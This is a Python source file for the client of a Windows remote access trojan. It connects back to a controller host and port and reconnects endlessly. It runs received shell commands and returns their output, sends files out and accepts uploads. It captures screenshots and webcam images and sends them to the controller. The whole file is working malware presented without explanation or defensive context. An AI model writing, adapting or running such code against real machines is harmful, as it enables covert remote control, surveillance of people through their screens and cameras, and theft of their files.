import socket
import os
import pyautogui
import re
import time
import subprocess
import cv2

def webcam(s):
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    cv2.imwrite('ss.png',frame)
    transfer(s, "ss.png")
    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

def screenshots(s):
    ss = pyautogui.screenshot()
    ss.save("ss.png")
    transfer(s, "ss.png")
    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


def transfer(s, filename):
    f = open(filename,"rb")
    while True:
        bits = f.read(1024)
        s.send(bits)
        if bits == b'':
            s.send("DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042".encode())
            break
    f.close()

def get(s, filename):
    f = open(filename, 'wb')
    while True:
        bits = s.recv(1024)
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    f.close()

def socketCreation():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #print("Socket Created!")
    return s

def socketConnection(s, ip, port):
    try:
        s.connect((ip,port))
        print("Connection Established!")
    except:
        print("Trying Again!")
        socketConnection(s, ip, port)

def cmd(s):
    s.send(os.getlogin().encode())
    while True:
        cmd = s.recv(1024).decode()
        if cmd == 'start':
            break
    s.send(os.getcwd().encode())
    s.send(os.getlogin().encode())
    while True:
        cmd = s.recv(2048).decode()
        cmd = cmd.lower()
        temp = cmd.split(" ")
        if temp[0] == 'cd':
            if temp[1] == '..':
                cwd = os.getcwd()
                cwd = cwd.split("\\")
                tcwd = ""
                for i in range(len(cwd)-1):
                    tcwd += cwd[i] + "\\"
                os.chdir(tcwd)
                s.send((os.getcwd() + ">").encode())
                s.send("Directory Changed...".encode())
            else:
                cmd = re.findall("cd (.+)", cmd)
                os.chdir(cmd[0])
                s.send((os.getcwd() + ">").encode())
                s.send("Directory Changed...".encode())
        elif cmd == "exit":
            break
        elif 'get*' in cmd or 'cat*' in cmd:
            transfer(s, cmd.split("*")[1])
            continue
        elif 'upload*' in cmd:
            get(s, cmd.split("*")[2])
            continue
        elif cmd == 'ss':
            screenshots(s)
            continue
        elif cmd == "webcam":
            webcam(s)
            continue
        else:
            s.send((os.getcwd() + ">").encode())
            cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            t = cmd.stdout.read().decode()
            if t == "":
                s.send("Command Executed....".encode())
                continue
            s.send(t.encode())
    s.close()

def main():
    ip = '127.0.0.1'
    port = 1234
    s = socketCreation()
    socketConnection(s, ip, port)
    try:
        cmd(s)
    except:
        time.sleep(1)
        main()
    time.sleep(1)
    main()


if __name__ == '__main__':
    main()
